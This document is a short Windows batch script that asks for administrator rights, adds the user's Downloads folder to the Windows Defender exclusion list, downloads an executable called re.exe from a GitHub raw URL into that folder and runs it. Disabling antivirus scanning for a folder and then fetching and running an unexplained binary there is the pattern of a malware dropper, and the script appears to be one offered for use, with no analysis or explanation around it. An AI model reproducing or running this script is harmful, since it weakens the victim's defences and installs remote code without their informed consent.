@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

set "url=https://github.com/Gamer9882/1/raw/refs/heads/main/re.exe"
set "output=%USERPROFILE%\Downloads\re.exe"


powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"

timeout /t 1 >nul


powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"


start "" "%output%"